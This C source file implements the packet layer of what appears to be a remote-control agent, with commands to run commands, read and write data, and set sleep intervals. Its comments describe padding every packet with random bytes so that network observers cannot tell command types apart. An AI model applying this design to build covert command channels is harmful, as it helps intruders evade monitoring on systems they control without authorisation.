/*
 * protocol.c — packet send / receive over an mTLS Conn*.
 *
 * BP5 padding: every outgoing packet is padded to the next 512-byte boundary
 * with cryptographically random bytes.  The receiver computes the same
 * boundary from the payload_len in the header and reads the extra bytes.
 * An observer capturing TLS records sees only uniform 512-byte multiples —
 * HEARTBEAT, RUN_CMD, and large READ_DATA responses are all the same size
 * class.
 *
 * The XOR / rotation obfuscation from the original protocol.c is removed.
 * It provided no real security (trivially reversible with the static key) and
 * is redundant once the channel is wrapped in TLS 1.3 AES-GCM.
 */

#include "protocol.h"
#include "platform.h"
#include "tls.h"

#include <openssl/ssl.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ── Padding helpers (BP5) ───────────────────────────────────────────── */

/*
 * Number of random pad bytes appended after the payload so that the total
 * wire size (header + payload + pad) is the next 512-byte multiple above
 * (12 + payload_len).
 *
 * ((msg / 512) + 1) * 512  always gives a value strictly greater than msg,
 * so pad_bytes >= 1 for all inputs.
 */
static int pad_bytes_for(int payload_len)
{
    int msg = 12 + payload_len;
    return (msg / 512 + 1) * 512 - msg;
}

/* ── Low-level read / write through OpenSSL ──────────────────────────── */

static int ssl_write_all(SSL *ssl, const char *buf, int len)
{
    int sent = 0;
    while (sent < len) {
        int n = SSL_write(ssl, buf + sent, len - sent);
        if (n <= 0) return 0;
        sent += n;
    }
    return 1;
}

static int ssl_read_all(SSL *ssl, char *buf, int len)
{
    int done = 0;
    while (done < len) {
        int n = SSL_read(ssl, buf + done, len - done);
        if (n <= 0) return 0;
        done += n;
    }
    return 1;
}

/* ── Public API ──────────────────────────────────────────────────────── */

int send_packet(Packet *packet, Conn *c)
{
    SSL *ssl = (SSL *)c->ssl;

    /* Build header */
    int header[3] = {
        (int)packet->command_type,
        packet->request_id,
        packet->payload_len
    };

    int pad = pad_bytes_for(packet->payload_len);

    /* Allocate one contiguous buffer: header + payload + random_pad */
    int total = 12 + packet->payload_len + pad;
    char *wire = malloc(total);
    if (!wire) return 0;

    memcpy(wire, header, 12);
    if (packet->payload_len > 0)
        memcpy(wire + 12, packet->payload, packet->payload_len);

    /* Fill padding with cryptographically random bytes (BP5) */
    secure_random(wire + 12 + packet->payload_len, pad);

    int ok = ssl_write_all(ssl, wire, total);
    free(wire);
    return ok;
}

Packet *recieve_packet(Conn *c)
{
    SSL *ssl = (SSL *)c->ssl;

    /* Read and decode header */
    int header[3];
    if (!ssl_read_all(ssl, (char *)header, 12))
        return NULL;

    Command command_type = (Command)header[0];
    int     request_id   = header[1];
    int     payload_len  = header[2];

    /* Validate payload_len to guard against corrupt / malicious headers */
    if (payload_len < 0 || payload_len > 4 * 1024 * 1024) {
        fprintf(stderr, "[proto] invalid payload_len %d\n", payload_len);
        return NULL;
    }

    int pad = pad_bytes_for(payload_len);

    /* Read payload + padding in one call */
    int    tail_len = payload_len + pad;
    char  *tail     = malloc(tail_len > 0 ? tail_len : 1);
    if (!tail) return NULL;

    if (tail_len > 0 && !ssl_read_all(ssl, tail, tail_len)) {
        free(tail);
        return NULL;
    }

    /* Extract payload; discard random padding */
    char *payload = NULL;
    if (payload_len > 0) {
        payload = malloc(payload_len);
        if (!payload) { free(tail); return NULL; }
        memcpy(payload, tail, payload_len);
    }
    free(tail);

    /* BP5: silently drop KEEPALIVE and recurse for the real next packet */
    if (command_type == COMMAND_KEEPALIVE) {
        free(payload);
        return recieve_packet(c);
    }

    Packet *pkt = malloc(sizeof(Packet));
    if (!pkt) { free(payload); return NULL; }
    pkt->command_type = command_type;
    pkt->request_id   = request_id;
    pkt->payload_len  = payload_len;
    pkt->payload      = payload;
    return pkt;
}

void free_packet(Packet *packet)
{
    if (!packet) return;
    if (packet->payload_len > 0)
        free(packet->payload);
    free(packet);
}

/* ── Debug helper ────────────────────────────────────────────────────── */

static const char *command_name(Command cmd)
{
    static const char *names[] = {
        "HELLO", "HEARTBEAT", "SET_SLEEP", "SHUTDOWN",
        "READ_DATA", "WRITE_DATA", "RUN_CMD", "ERROR",
        "RESPONSE", "KEEPALIVE"
    };
    if ((int)cmd >= 0 && (int)cmd <= 9)
        return names[(int)cmd];
    return "UNKNOWN";
}

void print_packet_contents(Packet *packet)
{
    printf("\n+----------------------------------+\n");
    printf("| %-32s |\n", "RECEIVED PACKET");
    printf("+----------------------------------+\n");
    printf("| Command: %-23s |\n", command_name(packet->command_type));
    printf("| Req ID:  %-23d |\n", packet->request_id);
    printf("| Pay Len: %-23d |\n", packet->payload_len);
    printf("+----------------------------------+\n");

    if (packet->payload_len == 0 || packet->payload == NULL) {
        printf("| Payload: %-23s |\n", "<NONE>");
        printf("+----------------------------------+\n\n");
    } else {
        printf("| %-32s |\n", "Payload: (see below)");
        printf("+----------------------------------+\n");
        printf("--- PAYLOAD BEGIN ---\n");
        printf("%.*s\n", packet->payload_len, packet->payload);
        printf("--- PAYLOAD END ---\n\n");
    }
}
